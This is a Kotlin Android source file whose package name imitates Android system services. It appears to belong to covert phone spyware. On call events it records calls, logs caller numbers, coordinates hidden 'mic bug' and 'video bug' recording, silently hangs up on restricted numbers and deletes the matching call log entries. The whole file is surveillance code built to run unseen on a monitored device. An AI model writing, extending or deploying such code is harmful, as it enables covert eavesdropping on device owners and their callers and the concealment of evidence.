package com.android.services.receiver

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import com.android.services.enums.CallRecordType
import com.android.services.enums.FcmPushStatus
import com.android.services.enums.View360InteruptionType
import com.android.services.models.CallRecord
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI.Companion.micBugStatus
import com.android.services.services.videoBug.VideoBugCommandProcessingBase
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.ui.activities.BackgroundServicesActivity
import com.android.services.util.*
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.voip.VoipCallRecordWorkerService
import org.greenrobot.eventbus.EventBus
import java.util.concurrent.Executors

@SuppressWarnings("deprecation")
class CallRecorderReceiver : BroadcastReceiver() {
    private val watchDogReceiver = WatchDogAlarmReceiver()

    @SuppressLint("MissingPermission", "NewApi")
    override fun onReceive(context: Context, intent: Intent) {
        logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Recorder Receiver Called")
        FirebasePushUtils.restartRemoteDataSyncService(context)
        AppUtils.checkAndCloseView360(context, View360InteruptionType.TYPE_CALL)
        if (AppConstants.syncCallRecording) {
            if (intent.action == "android.intent.action.PHONE_STATE") {
                val callState = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                logVerbose("${AppConstants.CALL_RECORD_TYPE} Call State = $callState")
                val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                number?.let {
                    logVerbose("${AppConstants.CALL_RECORD_TYPE}  Extra Incoming Call Number: $it")
                    AppUtils.appendLog(
                        context,
                        "\n\n\n${AppConstants.CALL_RECORD_TYPE}  Extra Incoming Call Number: $it"
                    )
                    mCallNumber = it
                }

                try {
                    val telephony =
                        context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?
                    telephony?.listen(object : PhoneStateListener() {
                        override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                            super.onCallStateChanged(state, incomingNumber)
                            incomingNumber?.let {
                                logVerbose("${AppConstants.CALL_RECORD_TYPE} Incoming Call Number: $it")
                                AppUtils.appendLog(
                                    context,
                                    "${AppConstants.CALL_RECORD_TYPE} Incoming Call Number: $it"
                                )
                                mCallNumber = it
                            }
                        }
                    }, PhoneStateListener.LISTEN_CALL_STATE)
                } catch (e: Exception) {
                    logException("${AppConstants.CALL_RECORD_TYPE} Error retrieving incoming call number: ${e.message}")
                    AppUtils.appendLog(
                        context,
                        "${AppConstants.CALL_RECORD_TYPE} Error retrieving incoming call number: ${e.message}"
                    )
                }

                if (TelephonyManager.EXTRA_STATE_OFFHOOK == callState) {
                    val isCallRecordingActive =
                        AppUtils.isServiceRunning(context, CallRecordWorkerService::class.java.name)
                    val isVoipCallRecordingActive =
                        AppUtils.isServiceRunning(context, VoipCallRecordWorkerService::class.java.name)
                    logVerbose("Call recording receiver detectec", "CallRecordingInfo")
                    val isVoipCall = isVoipCall()
                    if (!isVoipCallRecordingActive &&
                        !isVoipCall &&
                        !isCallRecordingActive && !isOffHookMarked) {
                        try {
                            isOffHookMarked = true
                            isIDLEStateMarked = false
                            val isMicrophoneAvailable = AppUtils.isMicrophoneAvailable(context)
                            if (AppUtils.isMicRecordingEnabled(
                                    context
                                )
                            ) {
                                stopMicBugAndStartRecording(context)
                            } else if (AppUtils.isVideoRecordingEnabled(
                                    context
                                )
                            ) {
                                stopVideoBugAndStartRecording(context)
                            }else {
                                if (isMicrophoneAvailable) {
                                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Microphone is Available to Record the Call")
                                    AppUtils.appendLog(
                                        context,
                                        "${AppConstants.CALL_RECORD_TYPE} Microphone is Available to Record the Call"
                                    )
                                    startCallRecord(context)
                                } else {
                                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Microphone is Busy to Record Calls")
                                    AppUtils.appendLog(
                                        context,
                                        "${AppConstants.CALL_RECORD_TYPE} Microphone is Busy to Record Calls"
                                    )
                                }
                            }

                            if (!mIsIncoming) {
                                val executorService = Executors.newSingleThreadExecutor()
                                executorService.execute {
                                    checkForCallAlert(context)
                                }
                            }
                        } catch (e: Exception) {
                            AppUtils.appendLog(
                                context,
                                "${AppConstants.CALL_RECORD_TYPE} exception state OffHook = ${e.message}"
                            )
                            logException("${AppConstants.CALL_RECORD_TYPE} exception state OffHook = ${e.message}")
                        }
                    }
                }

                if (TelephonyManager.EXTRA_STATE_IDLE == callState) {
                    isOffHookMarked = false
                    mIsIncoming = false
                    isRingingStateMarked = false

                    val isCallRecordingActive =
                        AppUtils.isServiceRunning(context, CallRecordWorkerService::class.java.name)
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Call State Idle")
                    AppUtils.appendLog(context, "${AppConstants.CALL_RECORD_TYPE} Call State Idle")
                    if (!isIDLEStateMarked) {
                        isIDLEStateMarked = true
                        if (isCallRecordingActive) {
                            AppUtils.appendLog(
                                context,
                                "${AppConstants.CALL_RECORD_TYPE} Ready to stop recording"
                            )
                            logVerbose(AppConstants.CALL_RECORD_TYPE + " Ready to stop recording")
                            stopCallRecordingService(context)
                        } else {
                            var executors=Executors.newSingleThreadExecutor()
                            executors.execute{
                                logVerbose("going to retriver mLastCallId","ANRInfoLogs")
                                mLastCallId = AppUtils.getLastCallId(context)
                                logVerbose("mLastCallId retreived mLastCallId=$mLastCallId","ANRInfoLogs")
                                AppUtils.addMissedCallLogs(context, mLastCallId)
                                mCallNumber = ""
                                AppUtils.appendLog(
                                    context,
                                    "${AppConstants.CALL_RECORD_TYPE} Unable to Record Call"
                                )
                                logVerbose("${AppConstants.CALL_RECORD_TYPE} Unable to Record Call")
                            }
                        }
                    }
                }

                if (TelephonyManager.EXTRA_STATE_RINGING == callState) {
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Call State Ringing")
                    AppUtils.appendLog(
                        context,
                        "${AppConstants.CALL_RECORD_TYPE} Call State Ringing"
                    )
                    mIsIncoming = true
                    isOffHookMarked = false
                    isIDLEStateMarked = false

                    if (!isRingingStateMarked) {
                        isRingingStateMarked = true
                        val executorService = Executors.newSingleThreadExecutor()
                        executorService.execute {
                            if (AppUtils.isNumberRestricted(context, mCallNumber)) {
                                logVerbose("${AppConstants.CALL_RECORD_TYPE} Number Restricted $mCallNumber")
                                AppUtils.appendLog(
                                    context,
                                    "${AppConstants.CALL_RECORD_TYPE} Number Restricted $mCallNumber"
                                )
                                if (AppConstants.osGreaterThanEqualToPie) {
                                    AppUtils.cutTheCall(context)
                                } else {
                                    AppUtils.disconnectCall()
                                }

                                // Deletes Last Call Log
                                Handler(Looper.getMainLooper()).postDelayed({
                                    AppUtils.deleteLastCallLog(
                                        context
                                    )
                                }, DEFAULT_CALL_DELAY)
                            }
                            // Executes the Call Alert Task
                            checkForCallAlert(context)
                        }
                    }
                }
            }
        } else {
            AppUtils.appendLog(
                context,
                "${AppConstants.CALL_RECORD_TYPE} Call Recording is Sync is stopped"
            )
            logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Recording is Sync is stopped")
        }
    }

    private fun isVoipCall(): Boolean {
        return if (mIsIncoming && mCallNumber.isNotEmpty()) {
            false
        } else {
            AppUtils.checkIsVoipCall()
        }
    }

    private fun checkForCallAlert(context: Context) {
        try {
            TextAlertUtils.performCallAlertTask(context, mCallNumber, mIsIncoming)
            EventBus.getDefault().post("syncTextAlerts")
        } catch (exception: Exception) {
            AppUtils.appendLog(
                context,
                "${AppConstants.TEXT_ALERT_TYPE} call alert exception = ${exception.message}"
            )
            logException("${AppConstants.TEXT_ALERT_TYPE} call alert exception = ${exception.message}")
        }
    }

    private fun stopMicBugAndStartRecording(context: Context) {
        logVerbose("${AppConstants.CALL_RECORD_TYPE} Stopping Mic Bug to Record the Call")
        AppUtils.appendLog(
            context,
            "${AppConstants.CALL_RECORD_TYPE} Stopping Mic Bug to Record the Call"
        )
        micBugStatus = FcmPushStatus.PHONE_CALL_INTERRUPTION.getStatus()
        AppUtils.stopMicBugCommandService(context)
        logVerbose("stoping mic bug and staring Call recording ", "CallRecordingInfo")
        Handler(Looper.getMainLooper()).postDelayed(
            { startCallRecord(context) },
            DEFAULT_CALL_DELAY
        )
    }

    private fun stopVoipCallRecordingAndStartRecording(context: Context) {
//        context.stopService(Intent(context, VoipCallCommandService::class.java))
        FutureWorkUtil.stopBackgroundWorker(context,VoipCallRecordWorkerService::class.java.name)
        logVerbose("stoping voip call and staring Call recording ", "CallRecordingInfo")
        Handler(Looper.getMainLooper()).postDelayed(
            { startCallRecord(context) },
            DEFAULT_CALL_DELAY
        )
    }

    private fun stopVideoBugAndStartRecording(context: Context) {
        logVerbose("${AppConstants.CALL_RECORD_TYPE} Stopping Video Bug to Record the Call")
        AppUtils.appendLog(
            context,
            "${AppConstants.CALL_RECORD_TYPE} Stopping Video Bug to Record the Call"
        )
        VideoBugCommandProcessingBase.videoBugStatus =
            FcmPushStatus.PHONE_CALL_INTERRUPTION.getStatus()
        AppUtils.stopVideoBugCommandService(context)
        logVerbose("stoping video bug and staring Call recording ", "CallRecordingInfo")
        Handler(Looper.getMainLooper()).postDelayed(
            { startCallRecord(context) },
            DEFAULT_CALL_DELAY
        )
    }

    companion object {

        const val DEFAULT_CALL_DELAY = 1500L
        var mCallNumber: String = ""
        var mFilepath: String? = null
        var mRecordingStartTime: Long = 0
        var mIsIncoming = false
        var mLastCallId = -1
        private var isOffHookMarked = false
        private var isRingingStateMarked = false
        private var isIDLEStateMarked = false

        /**
         * This calls the function to start the Call Recording service w.r.t Call Recording Method
         * @param context Context of the app
         */
        private fun startCallRecord(context: Context) {
            logVerbose("Call recording going to start", "CallRecordingInfo")
            if (AppConstants.callRecordingMethod == 0 || AppConstants.callRecordingMethod == 2) {
                logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Record Method: Native")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Call Record Method: Native"
                )
                startCallRecordingService(context, CallRecordType.TYPE_NATIVE_CALL)
            } else if (AppConstants.callRecordingMethod == 1) {
                logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Record Method: Microphone")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Call Record Method: Microphone"
                )
                startCallRecordingService(context, CallRecordType.TYPE_SIMPLE_CALL)
            } else if (AppConstants.callRecordingMethod == 3) {
                logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Record Method: VoiceCall")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Call Record Method: VoiceCall"
                )
                startCallRecordingService(context, CallRecordType.TYPE_SIMPLE_CALL)
            }
        }

        /**
         * Starts the Call Recording Service
         * @param callRecordType Type of the Call
         * [CallRecordType.TYPE_NATIVE_CALL] or [CallRecordType.TYPE_SIMPLE_CALL]
         * @param context Context of the app
         */
        private fun startCallRecordingService(context: Context, callRecordType: CallRecordType) {
            try {
                if (mCallNumber.isEmpty()) mCallNumber = ""
                val callType = if (mIsIncoming) "Incoming" else "Outgoing"
                logVerbose(AppConstants.CALL_RECORD_TYPE + " Extra Call Number : " + mCallNumber)
                logVerbose(AppConstants.CALL_RECORD_TYPE + " Extra Call Type : " + callType)
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Extra Call Number : $mCallNumber"
                )
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Extra Call Type : $callType"
                )
                val callRecord = CallRecord(callRecordType, mCallNumber, callType,AppUtils.formatDate(System.currentTimeMillis().toString()))

                context.startActivityWithData<BackgroundServicesActivity>(
                    listOf(
                        Intent.FLAG_ACTIVITY_NEW_TASK,
                        Intent.FLAG_ACTIVITY_CLEAR_TOP,
                        Intent.FLAG_ACTIVITY_CLEAR_TASK
                    ),
                    Pair(BackgroundServicesActivity.EXTRA_PARCELABLE_OBJECT, callRecord),
                    Pair(BackgroundServicesActivity.EXTRA_TYPE, AppConstants.CALL_RECORD_TYPE)
                )
                logVerbose("${AppConstants.CALL_RECORD_TYPE} Activity launched for recording")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Activity launched for recording   "
                )
            } catch (e: Exception) {
                logException("${AppConstants.CALL_RECORD_TYPE} Error starting call record service: ${e.message}")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Error starting call record service: ${e.message}"
                )
            }
        }

        /**
         * Stops the Call Running Recording Service
         * @param context Context
         */
        private fun stopCallRecordingService(context: Context) {
            try {
                mCallNumber = ""
                //context.stopService(Intent(context, CallRecorderService::class.java))
                FutureWorkUtil.stopBackgroundWorker(context,CallRecordWorkerService::class.java.name)
                logVerbose(AppConstants.CALL_RECORD_TYPE + " Microphone Recording Stopped")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Microphone Recording Stopped"
                )
            } catch (e: Exception) {
                logException("${AppConstants.CALL_RECORD_TYPE} Error stopping call record service: ${e.message}")
                AppUtils.appendLog(
                    context,
                    "${AppConstants.CALL_RECORD_TYPE} Error stopping call record service: ${e.message}"
                )
            }
        }
    }
}